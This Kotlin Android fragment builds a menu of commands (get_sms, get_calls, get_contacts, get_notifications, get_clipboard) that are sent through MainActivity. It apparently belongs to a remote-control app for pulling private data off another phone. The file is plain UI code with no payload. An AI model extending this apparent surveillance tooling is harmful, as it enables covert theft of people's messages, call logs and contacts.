package com.abuzahra.control.ui.smscalls

import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import androidx.recyclerview.widget.LinearLayoutManager
import com.abuzahra.control.MainActivity
import com.abuzahra.control.adapter.ActionAdapter
import com.abuzahra.control.adapter.ActionItem
import com.abuzahra.control.databinding.FragmentGenericBinding

class SmsCallsFragment : Fragment() {
    private var _b: FragmentGenericBinding? = null
    private val b get() = _b!!

    private val actions = listOf(
        ActionItem("💬", "الرسائل", "get_sms"),
        ActionItem("📞", "سجل المكالمات", "get_calls"),
        ActionItem("👤", "جهات الاتصال", "get_contacts"),
        ActionItem("🔔", "الإشعارات", "get_notifications"),
        ActionItem("📋", "الحافظة", "get_clipboard")
    )

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? {
        return try { _b = FragmentGenericBinding.inflate(inflater, container, false); b.root }
        catch (e: Exception) { Log.e("SMS", "Error: ${e.message}"); null }
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        if (_b == null) return
        b.tvSectionTitle.text = "📱 الرسائل والمكالمات"
        b.rvActions.layoutManager = LinearLayoutManager(requireContext())
        b.rvActions.adapter = ActionAdapter(actions) { a ->
            (activity as? MainActivity)?.sendCommand(a.command)
        }
    }

    override fun onDestroyView() { super.onDestroyView(); _b = null }
}
